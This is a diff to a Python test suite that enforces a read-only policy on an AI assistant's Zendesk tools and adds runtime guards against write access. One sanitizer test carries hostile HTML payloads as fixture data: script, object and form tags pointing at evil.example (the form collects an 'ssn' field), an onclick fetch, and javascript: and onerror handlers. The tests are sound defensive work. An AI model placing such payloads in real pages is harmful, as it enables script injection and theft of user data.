@@ -1,4 +1,4 @@
-"""WS5 — Renn Zendesk mirror tools (zendesk-clone-web).
+"""WS5 — Renn Zendesk mirror tools (zendesk-clone-web) + the READ-ONLY lockout.
 
 Locks: registration on BOTH dispatch paths (registry + chat_mcp_server
 TOOL_SCHEMAS with additionalProperties:false) plus the Claude-path mirror
@@ -11,9 +11,22 @@ replacement (never duplicated); the `results` telemetry alias on
 list-returning tools; the no-status-authority guarantee; propose-created
 drafts invisible to the native tab's list defaults; and the repointed
 legacy zendesk tools reading the mirror with ZERO network calls.
+
+Plus the OWNER-LOCKED read-only policy (2026-07-26): Zendesk is one-way —
+content comes IN (pull/import), nothing goes OUT. ``TestZendeskWriteLockout``
+enumerates EVERY tool on BOTH dispatch paths (registry + chat_mcp_server
+TOOL_SCHEMAS + claude_tools TOOL_DEFINITIONS) and fails the build if a new
+zendesk tool appears, if any zendesk tool name/description offers publishing
+or pushing, if the read-only wording is dropped, or if any module on the Renn
+tool path names a live-client write symbol. ``TestRuntimeWriteGuard`` covers
+the defense-in-depth runtime fence. Guru/Asana write paths are out of scope
+here by design and are NOT asserted against.
 """
 
+import io
 import json
+import re
+import tokenize
 from pathlib import Path
 
 import pytest
@@ -30,6 +43,77 @@ NEW_TOOLS = ("search_zendesk_mirror", "get_zendesk_article",
 
 LEGACY_TOOLS = ("search_zendesk_articles", "list_zendesk_articles",
                 "list_zendesk_macros")
+
+# The COMPLETE Zendesk tool surface Renn may ever see. Adding a tool here is
+# a policy decision, not a refactor: it must be mirror-only and read-only.
+ZENDESK_TOOLS = frozenset(NEW_TOOLS) | frozenset(LEGACY_TOOLS)
+
+# propose_* carry no "zendesk" in the name but are part of the family.
+_UNNAMED_FAMILY = frozenset({"propose_article_update", "propose_macro_update"})
+
+# Every module a Renn Zendesk tool call executes inside of.
+TOOL_PATH_MODULES = (
+    Path("src/data/chat_tools/zendesk_mirror_tools.py"),
+    Path("src/data/chat_tools/enablement_tools.py"),
+    Path("src/data/chat_tools/registry.py"),
+    Path("src/llm/claude_tools.py"),
+    Path("src/mcp/chat_mcp_server.py"),
+)
+
+# Live-Zendesk write symbols. None of these may appear as a CODE identifier
+# in any module on the tool path (prose in docstrings/comments is fine —
+# that is how the policy is explained to the next reader).
+BANNED_CODE_IDENTIFIERS = frozenset({
+    "create_article", "update_article", "delete_article",
+    "create_macro", "update_macro", "delete_macro",
+    "publish_article_draft", "publish_macro_draft", "set_draft_status",
+    "_write", "ZendeskClient", "zendesk_client",
+})
+
+_NEGATIONS = ("no ", "not ", "never", "cannot", "can not", "nothing",
+              "n't", "no tool")
+
+
+def _tool_names_and_descs():
+    """{path_label: {tool_name: description}} for BOTH dispatch paths."""
+    from src.data.chat_tools import registry as reg
+    from src.llm.claude_tools import TOOL_DEFINITIONS
+    from src.mcp.chat_mcp_server import TOOL_SCHEMAS
+    return {
+        "registry": {n: d.get("description", "")
+                     for n, d in reg.get_tool_registry().items()},
+        "chat_mcp_server.TOOL_SCHEMAS": {t["name"]: t.get("description", "")
+                                         for t in TOOL_SCHEMAS},
+        "claude_tools.TOOL_DEFINITIONS": {t["name"]: t.get("description", "")
+                                          for t in TOOL_DEFINITIONS},
+    }
+
+
+def _family(names) -> set:
+    return ({n for n in names if "zendesk" in n.lower()}
+            | (set(names) & _UNNAMED_FAMILY))
+
+
+def _publish_claims(desc: str) -> list:
+    """Occurrences of publish/push NOT inside a negation ('no tool can …').
+
+    'pushed' is stripped first: it is the legacy draft-status literal, a
+    past-tense label in an enum, never an offer to do something.
+    """
+    low = re.sub(r"pushed", "<legacy-status>", desc, flags=re.I).lower()
+    out = []
+    for m in re.finditer(r"publish\w*|push\w*", low):
+        window = low[max(0, m.start() - 90):m.start()]
+        if not any(neg in window for neg in _NEGATIONS):
+            out.append(low[max(0, m.start() - 90):m.end() + 30])
+    return out
+
+
+def _code_identifiers(rel_path: Path) -> set:
+    src = (ROOT / rel_path).read_text(encoding="utf-8")
+    return {t.string for t in
+            tokenize.generate_tokens(io.StringIO(src).readline)
+            if t.type == tokenize.NAME}
 
 ARTICLE = {"id": 101, "title": "Setting up SSO",
            "body_html": "<p>alpha tunnel body</p>", "section_id": 9,
@@ -229,6 +313,63 @@ class TestPropose:
         assert d["body"] == "# Heading\n\nBody."
         assert d["body_html"] and "<" in d["body_html"]  # markdown rendered
         assert d["article_id"] is None
+
+    def test_proposed_body_html_is_sanitized_at_the_write(self, mirror_db):
+        """VARIANT 2 regression. propose_article_update used to store
+        ``markdown_to_html(body_md)`` RAW, and markdown passes HTML blocks
+        straight through — so an LLM-authored (or prompt-injected) body put
+        <script src>, <form action>, <object data>, <meta refresh>,
+        <style>url()</style> and inline event handlers into body_html.
+        Those bytes are copy-exact material a specialist pastes into live
+        Zendesk by hand, and the readable review diff showed NO row for any
+        of them. Sanitize now runs at the WRITE, so the bytes never exist.
+        """
+        from src.data.html_sanitize import sanitize_html
+        body_md = (
+            "Normal paragraph.\n\n"
+            '<script src="https://evil.example/x.js"></script>\n\n'
+            '<form action="https://evil.example/collect">'
+            '<input name="ssn"></form>\n\n'
+            '<object data="https://evil.example/o"></object>\n\n'
+            '<meta http-equiv="refresh" content="0;url=https://evil.example">'
+            "\n\n<style>body{background:url(https://evil.example/b)}</style>"
+            '\n\n<p onclick="fetch(\'https://evil.example\')">Click</p>\n\n'
+            '<img src="x" onerror="alert(1)">\n\n'
+            '<a href="javascript:alert(1)">go</a>\n')
+        res = zmt.handle_propose_article_update(
+            mirror_db.conn,
+            {"title": "Hostile", "body_markdown": body_md,
+             "rationale": "attack payload"}, {})
+        assert res["ok"] is True and res["status"] == "pending"
+        d = zendesk_store.get_article_draft(mirror_db.conn, res["draft_id"])
+        stored = d["body_html"]
+        low = stored.lower()
+        for banned in ("<script", "<form", "<input", "<object", "<meta",
+                       "<style", "onclick", "onerror", "javascript:",
+                       "evil.example/x.js", "evil.example/collect",
+                       "evil.example/o", "evil.example/b"):
+            assert banned not in low, banned
+        # idempotent: the stored bytes are already a sanitize fixed point,
+        # so stored == renderable everywhere downstream
+        assert stored == sanitize_html(stored)
+        assert "Normal paragraph." in stored
+        # the markdown source is kept verbatim on purpose — it is the
+        # provenance record, and it is never the clipboard payload
+        assert d["body"] == body_md
+
+    def test_propose_macro_reply_lands_verbatim_in_the_actions(self,
+                                                               mirror_db):
+        """The macro reply is TEXT, not HTML: it must not be escaped or
+        rewritten (that would corrupt a legitimate reply). Its safety comes
+        from the review surface instead — the macro source diff renders the
+        exact action bytes and the clipboard is hash-bound to them."""
+        reply = "Use < and > freely; we quote them: 5 < 7."
+        res = zmt.handle_propose_macro_update(
+            mirror_db.conn,
+            {"name": "Quoting", "reply": reply, "rationale": "why"}, {})
+        assert res["ok"] is True
+        d = zendesk_store.get_macro_draft(mirror_db.conn, res["draft_id"])
+        assert d["actions"][0] == {"field": "comment_value", "value": reply}
 
     def test_propose_article_update_targets_mirror_row(self, mirror_db):
         res = zmt.handle_propose_article_update(
@@ -486,3 +627,147 @@ class TestRepointedLegacyTools:
         from src.data.chat_tools import enablement_tools as ET
         arm = ET._unified_zendesk_results(empty_db.conn, "tunnel", 8)
         assert arm["status"] == "empty_mirror" and arm["results"] == []
+
+
+# ── OWNER-LOCKED read-only policy (2026-07-26) ───────────────────────
+
+class TestZendeskWriteLockout:
+    """Zendesk is READ-ONLY: one-way API, human copy-paste, no AI reach."""
+
+    def test_zendesk_tool_surface_is_the_known_read_only_set(self):
+        """Every path exposes exactly the 9 mirror-only tools. A new zendesk
+        tool fails here until someone re-reads the policy."""
+        for label, tools in _tool_names_and_descs().items():
+            fam = _family(tools)
+            missing = set(ZENDESK_TOOLS) - fam
+            extra = fam - set(ZENDESK_TOOLS)
+            assert not missing, f"{label} lost zendesk tools: {sorted(missing)}"
+            assert not extra, (
+                f"{label} exposes UNDECLARED zendesk tool(s) {sorted(extra)} — "
+                "Zendesk is read-only; no new zendesk tool may ship without "
+                "re-reading the owner policy in zendesk_mirror_tools.py")
+
+    def test_no_tool_name_anywhere_offers_a_zendesk_write(self):
+        write_verb = re.compile(
+            r"publish|push|post|create|delete|sync|upload|write")
+        for label, tools in _tool_names_and_descs().items():
+            for name in tools:
+                low = name.lower()
+                if "zendesk" not in low:
+                    continue
+                assert not write_verb.search(low), (
+                    f"{label}: tool name '{name}' reads like a Zendesk write")
+
+    def test_no_zendesk_description_offers_publishing_or_pushing(self):
+        """Every publish/push word in the family must sit inside a negation."""
+        for label, tools in _tool_names_and_descs().items():
+            for name in sorted(_family(tools)):
+                claims = _publish_claims(tools[name])
+                assert not claims, (
+                    f"{label}: {name} description appears to OFFER "
+                    f"publishing/pushing to Zendesk: {claims}")
+
+    def test_every_zendesk_description_carries_the_read_only_language(self):
+        for label, tools in _tool_names_and_descs().items():
+            for name in sorted(_family(tools)):
+                low = tools[name].lower()
+                assert "read-only" in low, (
+                    f"{label}: {name} must tell the model Zendesk is READ-ONLY")
+                assert "by hand" in low, (
+                    f"{label}: {name} must say a human copies content into "
+                    "Zendesk by hand")
+
+    def test_propose_results_reinforce_the_human_copy(self, mirror_db):
+        art = zmt.handle_propose_article_update(
+            mirror_db.conn, {"title": "T", "body_markdown": "B",
+                             "rationale": "R"}, {})
+        mac = zmt.handle_propose_macro_update(
+            mirror_db.conn, {"name": "N", "reply": "Re", "rationale": "R"}, {})
+        for res in (art, mac):
+            note = res["note"].lower()
+            assert "read-only" in note
+            assert "by hand" in note
+            assert "specialist" in note
+
+    def test_tool_path_modules_name_no_client_write_symbol(self):
+        """Prose may explain the policy; CODE may never name a write symbol."""
+        for rel in TOOL_PATH_MODULES:
+            hits = BANNED_CODE_IDENTIFIERS & _code_identifiers(rel)
+            assert not hits, (
+                f"{rel.as_posix()} references live-Zendesk write symbol(s) "
+                f"{sorted(hits)} in code — Zendesk is read-only")
+
+    def test_registry_and_mcp_agree_on_the_family(self):
+        paths = _tool_names_and_descs()
+        assert (_family(paths["registry"])
+                == _family(paths["chat_mcp_server.TOOL_SCHEMAS"])
+                == _family(paths["claude_tools.TOOL_DEFINITIONS"]))
+
+
+class TestRuntimeWriteGuard:
+    """Defense in depth: the tools refuse if a mutator becomes reachable."""
+
+    ALL_CALLS = (
+        ("handle_search_zendesk_mirror", {"query": "tunnel"}),
+        ("handle_get_zendesk_article", {"article_id": 101}),
+        ("handle_get_zendesk_macro", {"macro_id": 201}),
+        ("handle_propose_article_update",
+         {"title": "T", "body_markdown": "B", "rationale": "R"}),
+        ("handle_propose_macro_update",
+         {"name": "N", "reply": "Re", "rationale": "R"}),
+        ("handle_list_zendesk_revisions", {}),
+    )
+
+    def test_guard_is_inert_in_a_clean_build(self):
+        zmt.guard_mirror_only()
+        assert zmt.write_reach_refusal(None) is None
+
+    def test_guard_raises_when_this_module_holds_a_mutator(self, monkeypatch):
+        monkeypatch.setattr(zmt, "create_article", lambda *a, **k: None,
+                            raising=False)
+        with pytest.raises(zmt.ZendeskWriteBlocked):
+            zmt.guard_mirror_only()
+
+    def test_guard_raises_for_a_sibling_module_on_the_tool_path(
+            self, monkeypatch):
+        from src.data.chat_tools import enablement_tools as ET
+        monkeypatch.setattr(ET, "update_macro", lambda *a, **k: None,
+                            raising=False)
+        with pytest.raises(zmt.ZendeskWriteBlocked):
+            zmt.guard_mirror_only()
+
+    def test_guard_raises_for_an_object_carrying_a_write_method(self):
+        class FakeClient:
+            def create_macro(self, *a, **k):
+                return None
+
+        with pytest.raises(zmt.ZendeskWriteBlocked):
+            zmt.guard_mirror_only(FakeClient())
+
+    def test_every_mirror_tool_refuses_while_a_mutator_is_reachable(
+            self, mirror_db, monkeypatch):
+        monkeypatch.setattr(zmt, "update_article", lambda *a, **k: None,
+                            raising=False)
+        for fn_name, args in self.ALL_CALLS:
+            res = getattr(zmt, fn_name)(mirror_db.conn, args, {})
+            assert res["ok"] is False, fn_name
+            assert res["error"] == "zendesk_write_blocked", fn_name
+
+    def test_legacy_zendesk_tools_refuse_too(self, mirror_db, monkeypatch):
+        from src.data.chat_tools import enablement_tools as ET
+        monkeypatch.setattr(zmt, "publish_article_draft",
+                            lambda *a, **k: None, raising=False)
+        for res in (ET._search_zendesk_articles_impl(mirror_db.conn, "sso"),
+                    ET._list_zendesk_articles_impl(mirror_db.conn),
+                    ET._list_zendesk_macros_impl(mirror_db.conn)):
+            assert res["ok"] is False
+            assert res["error"] == "zendesk_write_blocked"
+
+    def test_refusal_never_escapes_as_an_exception(self, mirror_db,
+                                                   monkeypatch):
+        """Registry contract: tools return dicts, they do not raise."""
+        monkeypatch.setattr(zmt, "_write", lambda *a, **k: None,
+                            raising=False)
+        res = json.loads(registry.dispatch_tool(
+            "search_zendesk_mirror", {"query": "tunnel"}, mirror_db.conn))
+        assert res["error"] == "zendesk_write_blocked"
